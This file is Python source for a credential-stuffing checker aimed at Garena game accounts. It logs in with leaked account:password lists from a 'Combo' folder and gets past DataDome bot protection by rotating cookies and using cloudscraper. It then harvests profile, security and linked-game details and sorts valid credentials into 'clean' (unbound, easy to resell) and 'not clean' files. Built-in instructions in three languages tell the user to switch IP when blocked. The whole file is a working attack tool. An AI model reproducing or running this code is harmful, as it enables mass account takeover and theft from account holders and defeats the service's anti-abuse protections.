            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }
        inspect_data = {"token": access_token}
        
        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data, timeout=30)
        session_key_roles = inspect_response.cookies.get('session_key')
        if not session_key_roles:
            logger.warning(f"[WARNING] No session_key in response cookies for {account}")
            return ["No game connections found"]
        
        try:
            inspect_data = inspect_response.json()
        except json.JSONDecodeError:
            logger.error(f"[ERROR] Invalid JSON response from token inspect for {account}")
            return ["No game connections found"]
            
        uac = inspect_data.get("uac", "ph").lower()
        region = uac if uac in valid_regions else 'ph'
        
        logger.info(f"[REGION] {region.upper()}")
        
        if region == 'th' or region == 'in':
            base_domain = "termgame.com"
        elif region == 'id':
            base_domain = "kiosgamer.co.id"
        elif region == 'vn':
            base_domain = "napthe.vn"
        else:
            base_domain = f"shop.garena.{region}"
        
        applicable_games = game_mappings.get(region, game_mappings['default'])
        detected_roles = {}
        
        for app_id, game_name in applicable_games.items():
            roles_url = f"https://{base_domain}/api/shop/apps/roles"
            params_roles = {'app_id': app_id}
            headers_roles = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                'Accept': "application/json, text/plain, */*",
                'Accept-Language': "en-US,en;q=0.5",
                'Accept-Encoding': "gzip, deflate, br, zstd",
                'Connection': "keep-alive",
                'Referer': f"https://{base_domain}/?app={app_id}",
                'Sec-Fetch-Dest': "empty",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Site': "same-origin",
                'Cookie': f"session_key={session_key_roles}"
            }
            
            try:
                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=30)
                
                try:
                    roles_data = roles_response.json()
                except json.JSONDecodeError:
                    print(f"{colorama.Fore.RED}[NOT FOUND] {game_name}..{colorama.Style.RESET_ALL}")
                    continue
                
                role = None
                if isinstance(roles_data.get("role"), list) and roles_data["role"]:
                    role = roles_data["role"][0]
                elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                    role = roles_data[app_id][0].get("role", None)
                
                if role:
                    detected_roles[app_id] = role
                    game_info.append(f"[{region.upper()} - {game_name} - {role}]")
                    print(f"{colorama.Fore.GREEN}[FOUND] {game_name} - {role}{colorama.Style.RESET_ALL}")
                else:
                    print(f"{colorama.Fore.RED}[NOT FOUND] {game_name}..{colorama.Style.RESET_ALL}")
            
            except Exception as e:
                logger.warning(f"[WARNING] Error checking game {game_name} for {account}: {e}")
                print(f"{colorama.Fore.RED}[NOT FOUND] {game_name}..{colorama.Style.RESET_ALL}")
        
        if not game_info:
            game_info.append(f"[{region.upper()} - No Game Detected]")
            logger.info(f"[INFO] No games detected")
            
    except Exception as e:
        logger.error(f"[ERROR] Error getting game connections for {account}: {e}")
        game_info.append("[Error fetching game data]")
    
    return game_info

def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    mobile_no = user_info.get('mobile_no', 'N/A')
    country_code = user_info.get('country_code', '')
    
    if mobile_no != 'N/A' and mobile_no and country_code:
        formatted_mobile = f"+{country_code}{mobile_no}"
    else:
        formatted_mobile = mobile_no
    
    mobile_bound = bool(mobile_no and mobile_no != 'N/A' and mobile_no.strip())
    
    email = user_info.get('email', 'N/A')
    email_verified = bool(user_info.get('email_v', 0))
    email_actually_bound = bool(email != 'N/A' and email and email_verified)
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': email,
        'email_verified': email_verified,
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': country_code,
            'mobile_no': formatted_mobile,
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) else "Not Bound",
            'mobile_actually_bound': mobile_bound,
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        
        'binds': [],
        'game_info': []
    }

    if email_actually_bound:
        account_info['binds'].append('Email')
    
    if account_info['personal']['mobile_actually_bound']:
        account_info['binds'].append('Phone')
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    
    if account_info['personal']['id_card'] != 'N/A' and account_info['personal']['id_card']:
        account_info['binds'].append('ID Card')

    account_info['bind_status'] = "Clean" if not account_info['binds'] else f"Bound ({', '.join(account_info['binds'])})"
    account_info['is_clean'] = len(account_info['binds']) == 0

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("⚠️ Suspicious")
    
    account_info['security_status'] = "✅ Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info

def save_account_details(account, password, details, codm_info=None):
    try:
        
        if not os.path.exists('Results'):
            os.makedirs('Results')
        
        
        codm_name = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'

        
        try:
            with open('valid_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(f"account: {account} | name: {codm_name} | uid: {codm_uid} | region: {codm_region}\n")
        except Exception as e:
            logger.error(f"[ERROR] Failed to save valid account {account}: {e}")

        
        try:
            if details['is_clean']:
                with open('Results/clean_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{account}:{password}\n")
                
                if codm_info:
                    with open('Results/clean_codm.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{account}:{password} | CODM: {codm_name} | Level: {codm_level} | Region: {codm_region} | UID: {codm_uid}\n")
            else:
                bind_info = ', '.join(details['binds'])
                with open('Results/notclean_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{account}:{password} | Binds: {bind_info}\n")
                
                if codm_info:
                    with open('Results/notclean_codm.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{account}:{password} | Binds: {bind_info} | CODM: {codm_name} | Level: {codm_level} | Region: {codm_region} | UID: {codm_uid}\n")
        except Exception as e:
            logger.error(f"[ERROR] Error saving clean/not clean account {account}: {e}")

       
        try:
            if codm_info:
                with open('Results/codm_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{account}:{password} | Nickname: {codm_name} | Level: {codm_level} | Region: {codm_region} | UID: {codm_uid}\n")
            else:
                with open('Results/valid_no_codm.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{account}:{password} | UID: {details['uid']} | Username: {details['username']}\n")
        except Exception as e:
            logger.error(f"[ERROR] Failed to save CODM account details for {account}: {e}")

        
        try:
            with open('Results/full_details.txt', 'a', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write(f"Account: {account}\n")
                f.write(f"Password: {password}\n")
                f.write(f"UID: {details['uid']}\n")
                f.write(f"Username: {details['username']}\n")
                f.write(f"Nickname: {details['nickname']}\n")
                f.write(f"Email: {details['email'][:3]}****@{details['email'].split('@')[-1] if '@' in details['email'] else 'N/A'}\n")
                
                mobile_no = details['personal']['mobile_no']
                if mobile_no != 'N/A' and mobile_no and not mobile_no.startswith('****') and len(mobile_no) > 4:
                    f.write(f"Phone: ****{mobile_no[-4:]}\n")
                else:
                    f.write(f"Phone: ****\n")
                
                f.write(f"Country: {details['personal']['country']}\n")
                f.write(f"Bind Status: {details['bind_status']}\n")
                f.write(f"Security Status: {details['security_status']}\n")
                f.write(f"Avatar: {details['profile']['avatar']}\n")
                f.write(f"Signature: {details['profile']['signature']}\n")
                f.write(f"Game Connections: {' | '.join(details['game_info'])}\n")
                if codm_info:
                    f.write(f"CODM Name: {codm_name}\n")
                    f.write(f"CODM Level: {codm_level}\n")
                    f.write(f"CODM Region: {codm_region}\n")
                    f.write(f"CODM UID: {codm_uid}\n")
                f.write("=" * 60 + "\n\n")
        except Exception as e:
            logger.error(f"[ERROR] Failed to save full details for {account}: {e}")

    except Exception as e:
        logger.error(f"[ERROR] Error saving account details for {account}: {e}")

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats):
    try:
        datadome_manager.clear_session_datadome(session)
        
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            success = datadome_manager.set_session_datadome(session, current_datadome)
            if success:
                logger.info(f"[INFO] Using existing DataDome cookie: {current_datadome[:30]}...")
            else:
                logger.warning(f"[WARNING] Failed to set existing DataDome cookie")
        else:
            datadome = get_datadome_cookie(session)
            if not datadome:
                live_stats.update_stats(valid=False)
                return f"[ERROR] {account}: DataDome cookie generation failed"
            datadome_manager.set_datadome(datadome)
            datadome_manager.set_session_datadome(session, datadome)
        
        v1, v2, new_datadome = prelogin(session, account, datadome_manager)
        
        if v1 == "IP_BLOCKED":
            return f"[ERROR] {account}: IP Blocked - New DataDome required"
        
        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Invalid (Prelogin failed)"
        
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
            logger.info(f"[INFO] Updated DataDome from prelogin: {new_datadome[:30]}...")
        
        sso_key = login(session, account, password, v1, v2)
        if not sso_key:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Invalid (Login failed)"
        
        try:
            session.cookies.set('sso_key', sso_key, domain='.garena.com')
        except Exception as e:
            logger.warning(f"[WARNING] Error setting sso_key cookie: {e}")
        
        headers = {
            'accept': '*/*',
            'cookie': f'sso_key={sso_key}',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        
        if response.status_code == 403:
            if datadome_manager.handle_403(session):
                return f"[ERROR] {account}: IP Blocked - New DataDome required"
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Banned (Cookie flagged)"
            
        try:
            account_data = response.json()
        except json.JSONDecodeError as e:
            logger.error(f"[ERROR] Invalid JSON response from account init for {account}: {e}")
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Invalid response from server"
        
        if 'error' in account_data:
            if account_data.get('error') == 'error_auth':
                live_stats.update_stats(valid=False)
                return f"[WARNING] {account}: Invalid (Authentication error)"
            live_stats.update_stats(valid=False)
            return f"[WARNING] {account}: Error fetching details ({account_data['error']})"
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        game_info = get_game_connections(session, account)
        details['game_info'] = game_info
        
        has_codm, codm_info = check_codm_account(session, account)
        
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
            logger.info(f"[INFO] Fresh cookie obtained for next account")
        
        save_account_details(account, password, details, codm_info if has_codm else None)
        
        
        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm)
        
        result = f"[SUCCESS] {account}: Valid ({details['bind_status']})"
        if has_codm:
            result += display_codm_info(account, codm_info)
        
        return result
        
    except Exception as e:
        logger.error(f"[ERROR] Unexpected error processing {account}: {e}")
        live_stats.update_stats(valid=False)
        return f"[ERROR] {account}: Processing error"

import os
import time
import random
import cloudscraper
from rich.console import Console


W = "\033[0m"
GR = "\033[90m"
R = "\033[1;31m"
RED = "\033[101m"
B = "\033[0;34m\033[1m"

console = Console()

def find_nearest_account_file():
    keywords = ["garena", "account", "codm"]
    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")

    txt_files = []
    for root, _, files in os.walk(combo_folder):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))

    for file_path in txt_files:
        if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
            return file_path

    if txt_files:
        return random.choice(txt_files)

    return os.path.join(combo_folder, "accounts.txt")

def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        unique_lines = []
        seen_lines = set()
        for line in lines:
            stripped_line = line.strip()
            if stripped_line and stripped_line not in seen_lines:
                unique_lines.append(line)
                seen_lines.add(stripped_line)

        if len(lines) == len(unique_lines):
            console.print(f"[yellow][*] No duplicate lines found in {os.path.basename(file_path)}.[/yellow]")
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(unique_lines)

        console.print(f"[green][+] Successfully removed {len(lines) - len(unique_lines)} duplicate lines from {os.path.basename(file_path)}.[/green]")
        return True
    except FileNotFoundError:
        console.print(f"[red][ERROR] File not found: {file_path}[/red]")
        return False
    except Exception as e:
        console.print(f"[red][ERROR] Failed to remove duplicates from {os.path.basename(file_path)}: {e}[/red]")
        return False

def remove_checked_accounts(file_path):
    """
    Removes lines marked as checked, done, valid, clean, or containing check symbols.
    """
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        cleaned_lines = []
        removed = 0
        for line in lines:
            stripped = line.strip().lower()
            if not stripped:
                continue
            if any(tag in stripped for tag in ["checked", "valid", "done", "clean", "✔", "✅"]):
                removed += 1
            else:
                cleaned_lines.append(line)

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(cleaned_lines)

        console.print(f"[green][+] Removed {removed} checked accounts from {os.path.basename(file_path)}[/green]")
    except Exception as e:
        console.print(f"[red][ERROR] {e}[/red]")

def select_input_file():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    combo_folder = os.path.join(script_dir, "Combo")

    translations_dict = {
        "tagalog": {
            "instructions": [
                "[!] MAGBASA KA PARA MAIWASAN ANG PAG TANONG!",
                "[*] AUTO GEN COOKIES NA YAN PAG NAGAMIT ANG STARTER COOKIES(cookies.txt)!",
                "[*] SA COOKIE FOLDER KA KUMUHA NG FRESH COOKIES!",
                "[*] KAPAG NAG IP BLOCKED NA, MAGPALIT KA NG IP AT COOKIES!",
                "[*] KUNG IP BLOCKED 2-3 TIMES NA SUNUD-SUNOD, JUMP KA BAWAT 200 COOKIE SETS!"
            ],
            "restart_message": "[!] RESTART MO CHECKER AT LAGYAN MO NG TXT YUNG COMBO FOLDER!"
        },
        "english": {
            "instructions": [
                "[!] READ THIS TO AVOID ASKING QUESTIONS!",
                "[*] COOKIES ARE AUTO-GENERATED ONCE STARTER COOKIES (fresh_cookie.txt) ARE USED!",
                "[*] GET FRESH COOKIES FROM fresh_cookie.txt!",
                "[*] IF IP IS BLOCKED, CHANGE YOUR IP AND COOKIES!",
                "[*] IF IP BLOCKED 2-3 TIMES IN A ROW, JUMP EVERY 200 COOKIE SETS!"
            ],
            "restart_message": "[!] RESTART THE CHECKER AND ADD YOUR TXT FILES TO THE COMBO FOLDER!"
        },
        "indonesian": {
            "instructions": [
                "[!] BACA INI UNTUK MENGHINDARI PERTANYAAN!",
                "[*] COOKIE AKAN OTOMATIS DIGENERASI SETELAH MENGGUNAKAN STARTER COOKIES (fresh_cookie.txt)!",
                "[*] AMBIL COOKIE BARU DARI fresh_cookie.txt!",
                "[*] JIKA IP DIBLOKIR, GANTI IP DAN COOKIE ANDA!",
                "[*] JIKA IP DIBLOKIR 2-3 KALI BERTURUT-TURUT, LOMPAT SETIAP 200 SET COOKIE!"
            ],
            "restart_message": "[!] MULAI ULANG CHECKER DAN TAMBAHKAN FILE TXT KE FOLDER COMBO!"
        }
    }

    show_instructions = console.input("[yellow][?] Do you want to show instructions? (type 'y' if yes or press enter if 'no'): [/yellow]").strip().lower()

    selected_language = "english"
    if show_instructions == 'y':
        console.print("[cyan][*] Available languages: 1. Tagalog, 2. English, 3. Indonesian[/cyan]")
        language_choice = console.input("[yellow][?] Select language (1-3, default 2 for English): [/yellow]").strip()

        language_map = {"1": "tagalog", "2": "english", "3": "indonesian"}
        selected_language = language_map.get(language_choice, "english")

        instructions = translations_dict[selected_language]["instructions"]

        max_length = max(len(instruction) for instruction in instructions) + 4
        border_width = max_length + 4

        console.print(f"[cyan]╔{'═' * (border_width - 2)}╗[/cyan]")
        console.print(f"[cyan]║{' INSTRUCTIONS ':^{border_width - 2}}║[/cyan]")
        console.print(f"[cyan]╠{'═' * (border_width - 2)}╣[/cyan]")
        for instruction in instructions:
            color = "yellow" if any(x in instruction for x in ["IP BLOCKED", "COOKIE FOLDER", "COOKIES"]) else "red"
            console.print(f"[cyan]║[/cyan] [{color}]{instruction:<{border_width - 4}}[/{color}] [cyan]║[/cyan]")
        console.print(f"[cyan]╚{'═' * (border_width - 2)}╝[/cyan]")
        console.print()

    if not os.path.exists(combo_folder):
        os.makedirs(combo_folder, exist_ok=True)
        console.print(f"[green][!] Successfully created Combo folder.[/green]")
        console.print(f"[yellow]{translations_dict[selected_language]['restart_message']}[/yellow]")
        exit(0)

    txt_files = [f for f in os.listdir(combo_folder) if f.endswith('.txt')]

    file_path = None

    if txt_files:
        console.print(f"[green][+] Found {len(txt_files)} txt files in Combo folder:[/green]")

        max_filename_length = max(len(f"{i}. {file}") for i, file in enumerate(txt_files, 1)) + 2
        max_size_length = 9
        max_line_count_length = max(
            len(f"{sum(1 for line in open(os.path.join(combo_folder, file), 'r', encoding='utf-8') if line.strip()):,}")
            for file in txt_files) + 2

        top_border = f"[cyan]╔{'═' * (max_filename_length + 2)}╦{'═' * (max_size_length + 2)}╦{'═' * (max_line_count_length + 2)}╗[/cyan]"
        header_border = f"[cyan]╠{'═' * (max_filename_length + 2)}╬{'═' * (max_size_length + 2)}╬{'═' * (max_line_count_length + 2)}╣[/cyan]"
        bottom_border = f"[cyan]╚{'═' * (max_filename_length + 2)}╩{'═' * (max_size_length + 2)}╩{'═' * (max_line_count_length + 2)}╝[/cyan]"

        console.print(top_border)
        console.print(
            f"[cyan]║ [white]{'Text File':^{max_filename_length}} [cyan]║ [white]{'Size':^{max_size_length}} [cyan]║ [white]{'Lines':^{max_line_count_length}} [cyan]║[/cyan]")
        console.print(header_border)

        for i, file in enumerate(txt_files, 1):
            file_path_full = os.path.join(combo_folder, file)
            file_size = os.path.getsize(file_path_full) / 1024
            try:
                with open(file_path_full, 'r', encoding='utf-8') as f:
                    line_count = sum(1 for line in f if line.strip())
            except Exception as e:
                line_count = 0
                console.print(f"[yellow][WARNING] Could not read lines in {file}: {e}[/yellow]")
            if file_size >= 1000:
                file_size_mb = file_size / 1024
                size_display = f"{file_size_mb:.1f}MB"
            else:
                size_display = f"{file_size:.2f}KB"
            line_count_display = f"{line_count:,}"
            filename_display = f"{i}. {file}"
            console.print(
                f"[cyan]║ [yellow]{filename_display:<{max_filename_length}} [cyan]║ [yellow]{size_display:>{max_size_length}} [cyan]║ [yellow]{line_count_display:>{max_line_count_length}} [cyan]║[/cyan]")

        console.print(bottom_border)

        while True:
            try:
                choice = console.input(
                    f"[yellow][?] Select a file (1-{len(txt_files)}) or press Enter to find nearest relevant file: [/yellow]").strip()
                if not choice:
                    file_path = find_nearest_account_file()
                    break
                choice_idx = int(choice) - 1
                if 0 <= choice_idx < len(txt_files):
                    file_path = os.path.join(combo_folder, txt_files[choice_idx])
                    break
                else:
                    console.print(
                        f"[red][!] Invalid selection. Please choose a number between 1 and {len(txt_files)}.[/red]")
            except ValueError:
                console.print(f"[red][!] Invalid input. Please enter a valid number or press Enter.[/red]")
    else:
        console.print(f"[yellow][!] No txt files found in Combo folder.[/yellow]")
        file_path = console.input(
            "Enter the path of the txt file (ex: /sdcard/Download/filename.txt) or press Enter to find the nearest relevant file: ").strip()
        if not file_path:
            file_path = find_nearest_account_file()

    if os.path.exists(file_path):
        remove_duplicates_choice = console.input(
            f"[yellow][?] Do you want to remove duplicate lines from {os.path.basename(file_path)}? (y/n, default n): [/yellow]").strip().lower()
        if remove_duplicates_choice == 'y':
            remove_duplicates_from_file(file_path)

    return file_path

def main():
    filename = select_input_file()
    
    if not os.path.exists(filename):
        logger.error(f"[ERROR] File '{filename}' not found.")
        return
    
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    
    session = cloudscraper.create_scraper()
    valid_cookies = cookie_manager.get_valid_cookies() 
    cookie_count = len(valid_cookies)

    if valid_cookies:
        combined_cookie_str = "; ".join(valid_cookies)
        
        logger.info(f"[𝙄𝙉𝙁𝙊] Loaded and applied {cookie_count} saved cookies to session.") 
        applyck(session, combined_cookie_str)
        final_cookie_value = valid_cookies[-1]
        datadome_value = final_cookie_value.split('=', 1)[1].strip() if '=' in final_cookie_value and len(final_cookie_value.split('=', 1)) > 1 else None
        
        if datadome_value:
            datadome_manager.set_datadome(datadome_value)
            
    else:
        logger.info(f"[𝙄𝙉𝙁𝙊] No saved cookies found. Starting fresh session and generating DataDome.")
        
        datadome = get_datadome_cookie(session)
        if datadome:
            datadome_manager.set_datadome(datadome)
            logger.info(f"[𝙄𝙉𝁉FO] Generated initial DataDome cookie")    
    accounts = []
    encodings_to_try = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
    
    for encoding in encodings_to_try:
        try:
            with open(filename, 'r', encoding=encoding) as file:
                accounts = [line.strip() for line in file if line.strip()]
            logger.info(f"[SUCCESS] File loaded with {encoding} encoding")
            break
        except UnicodeDecodeError:
            logger.warning(f"[WARNING] Failed to read with {encoding} encoding, trying next...")
            continue
        except Exception as e:
            logger.error(f"[ERROR] Error reading file with {encoding}: {e}")
            continue
    
    if not accounts:
        try:
            logger.info(f"[INFO] Trying with error handling...")
            with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
                accounts = [line.strip() for line in file if line.strip()]
            logger.info(f"[SUCCESS] File loaded with error handling")
        except Exception as e:
            logger.error(f"[ERROR] Could not read file with any encoding: {e}")
            return
    
    if not accounts:
        logger.error(f"[ERROR] No accounts found in file '{filename}'")
        return
    
    logger.info(f"[𝙄𝙉𝙁𝙊] Total accounts to process: {len(accounts)}")
    
    for i, account_line in enumerate(accounts, 1):
        if ':' not in account_line:
            logger.warning(f"[WARNING] Skipping invalid account line: {account_line}")
            continue
            
        try:
            account, password = account_line.split(':', 1)
            account = account.strip()
            password = password.strip()
            logger.critical(f"[𝙄𝙉𝙁𝙊] Processing {i}/{len(accounts)}: {account}... ")

            result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats)
            logger.info(result)
            
            print(f"\n{live_stats.display_stats()}", flush=True)
            
        except Exception as e:
            logger.error(f"[ERROR] Error processing account line {i}: {e}")
            continue
    
    final_stats = live_stats.get_stats()
    print()
    logger.info(f"[FINAL STATS] VALID: {final_stats['valid']} | INVALID: {final_stats['invalid']} | CLEAN: {final_stats['clean']} | NOT CLEAN: {final_stats['not_clean']} | HAS CODM: {final_stats['has_codm']} | NO CODM: {final_stats['no_codm']} -> config @LEGITYAMI")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info(f"[INFO] Script terminated by user")
    except Exception as e:
        logger.error(f"[ERROR] Unexpected error in main: {e}")